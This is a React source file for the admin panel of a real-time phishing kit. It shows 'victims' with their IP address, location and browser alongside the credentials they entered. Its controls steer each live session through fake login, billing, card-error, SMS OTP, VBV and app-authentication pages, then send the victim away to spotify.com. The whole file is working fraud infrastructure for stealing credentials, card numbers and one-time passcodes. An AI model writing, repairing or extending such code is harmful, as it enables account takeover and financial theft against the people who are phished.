import React, { useState, useEffect } from 'react';
import { socket } from '../index';
import './AdminPanel.css';

const AdminPanel = () => {
  const [activeUsers, setActiveUsers] = useState([]);
  const [previousUsers, setPreviousUsers] = useState([]);
  const [routes, setRoutes] = useState({});
  const [showModal, setShowModal] = useState(false);
  const [currentSessionId, setCurrentSessionId] = useState('');
  const [inputsConfig, setInputsConfig] = useState([
    { id: 1, name: "1", type: 'hidden', placeholder: '' },
    { id: 2, name: "2", type: 'hidden', placeholder: '' },
    { id: 3, name: "3", type: 'hidden', placeholder: '' }
  ]);
  useEffect(() => {
    if (!localStorage.getItem('iamaAdmin')) {
      const password = prompt("");
      if (password === process.env.REACT_APP_ADMIN_PASSWORD) {
        localStorage.setItem('iamaAdmin', 'true');
      } else {
        window.location.href = '/';
        return;
      }
    }

    const handleUpdate = (data) => {
      setActiveUsers(data.activeUsers || []);
      setPreviousUsers(data.previousUsers || []);
    };

    socket.on('update', handleUpdate);
    
    // Load initial data
    fetch(`${process.env.REACT_APP_API_URL}/api/users`)
      .then(res => res.json())
      .then(data => {
        setActiveUsers(data.activeUsers || []);
        setPreviousUsers(data.previousUsers || []);
      })
      .catch(console.error);

    fetch(`${process.env.REACT_APP_API_URL}/api/previous-users`)
      .then(res => res.json())
      .then(data => {
        setPreviousUsers(data || []);
      })
      .catch(console.error);

    return () => socket.off('update');
  }, []);

  const handleRouteChange = (sessionId, newRoute) => {
    fetch(`${process.env.REACT_APP_API_URL}/api/change-route`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId,
        newRoute
      })
    })
    .then(response => {
      if (response.ok) {
        setRoutes(prev => ({
          ...prev,
          [sessionId]: ''
        }));
      }
    })
    .catch(error => console.error('Error changing route:', error));
  };
const toggleShowPrevious = () => {
    const div = document.getElementById('show');
    if (div) {
      if (div.style.display === 'none') {
        div.style.display = ''; // Reset to default
      } else {
        div.style.display = 'none'; // Hide the div
      }
    }};
  const handleOut = (sessionId) => {
    console.log(`Redirecting session ${sessionId} to Google`);
    socket.emit('redirectUser', { sessionId, url: 'https://spotify.com' });
  };

  const handleAddCustomInput = (sessionId) => {
    setCurrentSessionId(sessionId);
    setShowModal(true);
  };

  const handleInputConfigChange = (index, field, value) => {
    setInputsConfig(prev => {
      const newConfig = [...prev];
      newConfig[index][field] = value;
      return newConfig;
    });
  };

  const handleSaveInput = () => {
    console.log('Emitting configureInputs event:', { sessionId: currentSessionId, inputsConfig });
    socket.emit('configureInputs', { sessionId: currentSessionId, inputsConfig });
    localStorage.setItem(`inputsConfig_${currentSessionId}`, JSON.stringify(inputsConfig));
    setShowModal(false);
    handleRouteChange(currentSessionId, '/otpSubmit'); // Redirect immediately after saving input configuration
  };

  const handleStopSpinner = (sessionId) => {
    socket.emit('stopSpinner', { sessionId });
    handleRouteChange(sessionId, '/otpSubmit_error'); // Redirect to custom error container
  };

  const UserCard = ({ user, isActive }) => {
    if (!user || !user.sessionId) {
      return null;
    }

    return (
      <div className="user-card">
        <div className="user-info">
          <div className="card-header">
            <span>Session: {user.sessionId}</span>
            <span>{new Date(user.timestamp).toLocaleTimeString()}</span>
          </div>
          <p><strong>Victim's IP:</strong> {user.ip}</p>
          <p><strong>Victim's Location:</strong> {user.country}</p>
          <p><strong>Victim's Current View:</strong> {user.pageUrl}</p>
          <p><strong>Victim's Event Type:</strong> {user.eventType}</p>
          <p><strong>Victim's Browser:</strong> {user.browserInfo}</p> {/* Display browser information */}
          {user.componentName && <p><strong>Component:</strong> {user.componentName}</p>}
          {!isActive && (
            <p className="disconnected-time">
              <strong>Disconnected:</strong> {new Date(user.disconnectedAt).toLocaleString()}
            </p>
          )}
        </div>
        <div className="user-inputs">
          {user.inputs && Object.entries(user.inputs).map(([key, data]) => (
            <div key={key} className="input-data">
              <span>{key}: {data.value}</span>
            </div>
          ))}
        </div>
        <div className="route-buttons">
          <button onClick={() => handleRouteChange(user.sessionId, '/')}>
            Login
          </button>
          <button onClick={() => handleRouteChange(user.sessionId, '/billingUpdate')}>
            billng
          </button>
<button onClick={() => handleRouteChange(user.sessionId, '/billingUpdate_Error')}>
            CC Error
          </button>          
<button  onClick={() => handleRouteChange(user.sessionId, '/otp_submit')}>
            sms
          </button>
          <button className='hoverror' onClick={() => handleRouteChange(user.sessionId, '/otp_submitError')}>
            sms error
          </button>
          <button onClick={() => handleAddCustomInput(user.sessionId)}>
            vbv custom
          </button>
          <button className='hoverror' onClick={() => handleStopSpinner(user.sessionId)}>
            vbv custom + error
          </button>
          <button onClick={() => handleRouteChange(user.sessionId, '/mobileAuth')}>
            app
          </button>
          <button onClick={() => handleOut(user.sessionId)}>
            /out
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="admin-panel">
      <div className="panel-section">
        <h2>Active Victims ({activeUsers.length})</h2>
        <div className="users-grid">
          {activeUsers.map(user => (
            <UserCard key={user.sessionId} user={user} isActive={true} />
          ))}
        </div>
      </div>
<button onClick={toggleShowPrevious}>
        Toggle Previous Victims
      </button>
      <div id="show" className="panel-section">
        <h2>Previous Victims ({previousUsers.length})</h2>
        <div className="users-grid">
          {previousUsers.map(user => (
            <UserCard key={`${user.sessionId}-${user.disconnectedAt}`} user={user} isActive={false} />
          ))}
        </div>
      </div>

      {showModal && (
        <div className="modal-overlay">
          <div className="modal">
            <h2>Configure Custom Inputs</h2>
            <div className="input-config">
              {inputsConfig.map((input, index) => (
                <div key={input.id}>
                  <select
                    value={input.type}
                    onChange={(e) => handleInputConfigChange(index, 'type', e.target.value)}
                  >
                    <option value="hidden">Hidden</option>
                    <option value="text">Text</option>
                  </select>
                  {input.type === 'text' && (
                    <input
                      type="text"
                      value={input.placeholder}
                      onChange={(e) => handleInputConfigChange(index, 'placeholder', e.target.value)}
                      placeholder="Placeholder"
                    />
                  )}
                </div>
              ))}
            </div>
            <button onClick={handleSaveInput}>Save</button>
            <button onClick={() => setShowModal(false)}>Cancel</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel;
